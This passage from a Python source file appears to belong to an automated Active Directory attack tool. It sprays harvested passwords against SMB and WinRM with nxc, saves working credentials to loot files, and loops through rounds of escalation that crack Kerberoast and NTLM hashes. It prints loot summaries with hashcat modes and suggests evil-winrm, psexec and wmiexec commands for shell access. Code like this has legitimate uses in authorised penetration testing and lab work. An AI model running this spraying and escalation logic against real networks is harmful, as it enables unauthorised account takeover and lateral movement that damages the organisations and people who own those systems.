        # can't crash it with PermissionError.
        out2 = runner.run(cmd2, f"dns_dnsrecon_{domain}", timeout=120,
                          env={"HOME": str(runner.ws.machine_dir)})
        findings.cmd(" ".join(cmd2))
        if out2.strip():
            findings.code_block(out2.strip())


def _run_cred_reuse(
    ip: str, runner: Runner, findings: Findings,
    ws: Workspace, services: list[Service], available: set[str],
):
    """
    Spray each password from loot/creds_found.txt against SMB and WinRM
    using the full loot/users.txt list.  Respects the discovered lockout
    threshold: warns when > 0, proceeds freely when 0 or unknown.
    """
    creds_file = ws.loot_dir / "creds_found.txt"
    users_file = ws.loot_dir / "users.txt"
    passwords = [l.strip() for l in creds_file.read_text().splitlines() if l.strip()]
    if not passwords:
        return

    findings.h2("Credential Re-use")

    threshold = ws.lockout_threshold
    if threshold == 0:
        findings.bullet("**No account lockout — spraying all discovered passwords**")
    elif threshold > 0:
        findings.note(
            f"**Lockout threshold: {threshold}** — spraying one password at a time; "
            "monitor for lockouts"
        )
    else:
        findings.bullet("Lockout policy unknown — spraying cautiously (one password at a time)")

    import tempfile
    open_tcp = {s.port for s in services if s.proto == "tcp"}
    all_users = [u.strip() for u in users_file.read_text().splitlines() if u.strip()]

    for password in passwords:
        if "nxc" not in available:
            break

        # Skip (user, password) pairs already sprayed (e.g. by a later escalation
        # round) — fewer redundant logins.
        targets = ws.unsprayed_users(all_users, password)
        if not targets:
            continue
        tf = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
        tf.write("\n".join(targets)); tf.close()
        user_arg = tf.name

        if 445 in open_tcp:
            cmd = [
                "nxc", "smb", ip,
                "-u", user_arg, "-p", password,
                "--continue-on-success",
            ]
            out = runner.run(cmd, f"cred_smb_{re.sub(r'[^a-z0-9]', '_', password.lower())[:16]}", timeout=120)
            findings.cmd(f"nxc smb {ip} -u [users:{len(targets)}] -p *** --continue-on-success")
            for line in out.splitlines():
                if "[+]" in line:
                    m = re.search(r"\\([^\s\\:]+)", line)
                    hit = f"{m.group(1)}:{password}" if m else password
                    if "Pwn3d!" in line:
                        findings.bullet(f"**ADMIN access via SMB:** `{line.strip()}`")
                        findings.add_summary(f"**Admin SMB shell** `{hit}` — `psexec`/`wmiexec`")
                    else:
                        findings.bullet(f"**Valid SMB credential:** `{line.strip()}`")
                        findings.add_summary(f"Valid SMB credential: `{hit}`")
                    _save_valid_cred(ws, line.strip(), password, "SMB")

        if 5985 in open_tcp:
            cmd2 = [
                "nxc", "winrm", ip,
                "-u", user_arg, "-p", password,
                "--continue-on-success",
            ]
            out2 = runner.run(cmd2, f"cred_winrm_{re.sub(r'[^a-z0-9]', '_', password.lower())[:16]}", timeout=120)
            findings.cmd(f"nxc winrm {ip} -u [users:{len(targets)}] -p *** --continue-on-success")
            for line in out2.splitlines():
                if "[+]" in line:
                    m = re.search(r"\\([^\s\\:]+)", line)
                    hit_user = m.group(1) if m else "USER"
                    findings.bullet(f"**Valid WinRM credential (shell!):** `{line.strip()}`")
                    findings.add_summary(
                        f"**WinRM shell** as `{hit_user}` — "
                        f"`evil-winrm -i {ip} -u {hit_user} -p {password}`"
                    )
                    _save_valid_cred(ws, line.strip(), password, "WinRM")

        os.unlink(user_arg)


def _parse_valid_creds(ws: "Workspace") -> set[tuple[str, str]]:
    """
    Read loot/valid_creds.txt into a set of (user, password) pairs.
    Handles both write formats: `user:pass` (cred-reuse) and
    `user:pass  [service]` (creds mode).
    """
    pairs: set[tuple[str, str]] = set()
    path = ws.loot_dir / "valid_creds.txt"
    if not path.exists():
        return pairs
    for line in path.read_text().splitlines():
        line = re.sub(r"\s*\[[^\]]*\]\s*$", "", line.strip())  # drop trailing [service]
        if not line or ":" not in line:
            continue
        user, password = line.split(":", 1)
        user, password = user.strip(), password.strip()
        if user and password:
            pairs.add((user, password))
    return pairs


def _run_credentialed_rounds(
    ip: str, domain: str, seed_creds: list[tuple[str, str]],
    runner: Runner, findings: Findings, ws: Workspace,
    services: list[Service], available: set[str], max_rounds: int = 10,
):
    """
    Run the credentialed phase for `seed_creds`, then recursively for any newly
    validated creds it surfaces, until a round adds nothing new (capped at
    max_rounds). Each `run_creds_mode` call internally cracks fresh
    Kerberoast/NTLM hashes and sprays them, so new valid creds appear in
    loot/valid_creds.txt; we diff that file across rounds to drive escalation.
    """
    from lib.credsmode import run_creds_mode

    seen = _parse_valid_creds(ws)
    ran: set[tuple[str, str]] = set()
    # de-dupe seed while preserving order
    pending = list(dict.fromkeys(seed_creds))
    round_num = 0

    while pending and round_num < max_rounds:
        round_num += 1
        batch = [c for c in pending if c not in ran]
        if not batch:
            break

        users = ", ".join(u for u, _ in batch)
        findings.h2(f"Credentialed Escalation — Round {round_num}")
        findings.bullet(f"Running credentialed enumeration as: {users}")
        ui.info(f"Credentialed round {round_num}/{max_rounds}: as {users}")

        run_creds_mode(ip, domain, batch, services, runner, findings, ws, available)
        ran.update(batch)

        now = _parse_valid_creds(ws)
        new = now - seen
        seen = now
        pending = [c for c in sorted(new) if c not in ran]
        if pending:
            ui.good(f"Round {round_num} surfaced {len(pending)} new credential(s) — escalating")
        else:
            findings.bullet(f"Round {round_num}: no new credentials — escalation complete")

    if round_num >= max_rounds and pending:
        findings.note(
            f"Escalation hit the {max_rounds}-round cap with creds still unprocessed "
            f"({', '.join(u for u, _ in pending)}) — run `--mode creds` manually to continue"
        )


def _print_dir_tree(path, prefix: str = "", max_depth: int = 4, depth: int = 0):
    if depth >= max_depth:
        return
    try:
        entries = sorted(path.iterdir(), key=lambda e: (e.is_file(), e.name))
    except PermissionError:
        return
    for i, entry in enumerate(entries):
        connector = "└── " if i == len(entries) - 1 else "├── "
        ui.debug(f"{prefix}{connector}{entry.name}")
        if entry.is_dir():
            extension = "    " if i == len(entries) - 1 else "│   "
            _print_dir_tree(entry, prefix + extension, max_depth, depth + 1)


def _print_loot_summary(ws: "Workspace"):
    from pathlib import Path

    W = 60
    print(f"\n{'═' * W}")
    print(f"  LOOT SUMMARY")
    print(f"{'═' * W}")

    # Users
    users_path = ws.loot_dir / "users.txt"
    if users_path.exists():
        users = [l.strip() for l in users_path.read_text().splitlines() if l.strip()]
        if users:
            print(f"\n  Users ({len(users)}):")
            for u in users[:20]:
                ui.debug(f"{u}")
            if len(users) > 20:
                ui.debug(f"... ({len(users) - 20} more in loot/users.txt)")

    # Hashes
    hash_specs = [
        ("kerberoast.hash", "Kerberoast ", 13100),
        ("asrep.hash",      "AS-REP     ", 18200),
        ("ntlm.hash",       "NTLM       ", 1000),
    ]
    hash_lines = []
    for fname, label, mode in hash_specs:
        hp = ws.loot_dir / fname
        if hp.exists():
            count = sum(1 for l in hp.read_text().splitlines() if l.strip())
            if count:
                hash_lines.append((label, count, fname, mode))

    # LAPS hashes from creds_found
    laps_path = ws.loot_dir / "creds_found.txt"
    laps_count = 0
    if laps_path.exists():
        laps_count = sum(1 for l in laps_path.read_text().splitlines()
                         if "LAPS" in l.upper() and l.strip())

    if hash_lines or laps_count:
        print(f"\n  Hashes:")
        for label, count, fname, mode in hash_lines:
            ui.debug(f"{label} ({count})  → loot/{fname}  [hashcat -m {mode}]")
        if laps_count:
            ui.debug(f"LAPS       ({laps_count})  → loot/creds_found.txt")

    # SMB file tree
    smb_root = ws.loot_dir / "creds_smb"
    if smb_root.exists():
        smb_files = list(smb_root.rglob("*"))
        file_count = sum(1 for f in smb_files if f.is_file())
        if file_count:
            print(f"\n  SMB Files ({file_count}):")
            ui.debug(f"loot/creds_smb/")
            _print_dir_tree(smb_root)

    # Credentials
    cred_files = [
        ("valid_creds.txt",  "SMB/WinRM"),
        ("creds_found.txt",  "loot"),
    ]
    cred_lines = []
    for fname, label in cred_files:
        cp = ws.loot_dir / fname
        if cp.exists():
            lines = [l.strip() for l in cp.read_text().splitlines() if l.strip()]
            for l in lines:
                cred_lines.append(f"{l}  ({label})")
    if cred_lines:
        seen = set()
        print(f"\n  Credentials:")
        for cl in cred_lines:
            if cl not in seen:
                seen.add(cl)
                ui.debug(f"{cl}")

    print()


def _save_valid_cred(ws: Workspace, line: str, password: str, service: str = "SMB"):
    # Capture only the account, stopping at the ':' before the password and any
    # whitespace — `DOMAIN\user:pass` must yield `user`, not `user:pass`.
    # Route through ws.add_valid_cred so this and the creds-mode writer share one
    # dedup keyed on (user, password) and one output format.
    m = re.search(r"\\([^\s\\:]+)", line)
    username = m.group(1) if m else "unknown"
    ws.add_valid_cred(username, password, service)


def _dedup_services(services: list[Service]) -> list[Service]:
    """
    When sibling ports share the same handler, keep only the primary one.
    The port table in findings still shows all ports; only the handler dispatch is deduped.
    """
    open_tcp = {s.port for s in services if s.proto == "tcp"}
    open_udp = {s.port for s in services if s.proto == "udp"}
    drop: set[tuple[int, str]] = set()

    if 445 in open_tcp and 139 in open_tcp:   # SMB: 445 supersedes 139
        drop.add((139, "tcp"))
    if 389 in open_tcp:
        # Plaintext LDAP serves the same anonymous data as its LDAPS/GC siblings
        # on the same DC. Enumerate once on 389; the others only add redundant
        # (and, for LDAPS, cert-handshake-prone) queries.
        for sib in (3268, 636, 3269):
            if sib in open_tcp:
                drop.add((sib, "tcp"))
    elif 636 in open_tcp and 3269 in open_tcp:  # no plaintext LDAP: 636 supersedes GC LDAPS
        drop.add((3269, "tcp"))
    if 88 in open_tcp and 88 in open_udp:     # Kerberos: TCP and UDP hit same handler
        drop.add((88, "udp"))
    if 53 in open_udp and 53 in open_tcp:     # DNS: UDP is primary; TCP rarely adds more
        drop.add((53, "tcp"))

    if not drop:
        return services

    for port, proto in sorted(drop):
        ui.info(f"Dedup: skipping {proto.upper()} {port} (covered by sibling port)")
    return [s for s in services if (s.port, s.proto) not in drop]


_SS_NOISE = re.compile(
    r"Windows\s+(XP|2000|NT\s*4|9[58]|ME)\b|"
    r"\bSolaris\s+\d|\bAIX\s+\d|\bIRIX\s+\d",
    re.IGNORECASE,
)

def _write_searchsploit(output: str, findings: Findings):
    seen: set[str] = set()
    kept: list[str] = []
    for line in output.splitlines():
        s = line.strip()
        if not s:
            continue
        if s.startswith("-") or "Exploit Title" in s or "ShellCodes" in s or "Exploits:" in s:
            continue
        if _SS_NOISE.search(s):
            continue
        key = s.rsplit("|", 1)[-1].strip() if "|" in s else s
        if key in seen:
            continue
        seen.add(key)
        kept.append(s)

    if kept:
        for line in kept[:25]:
            findings.bullet(line)
        if len(kept) > 25:
            findings.note(f"{len(kept) - 25} additional results omitted — run `searchsploit --nmap` manually")


if __name__ == "__main__":
    main()
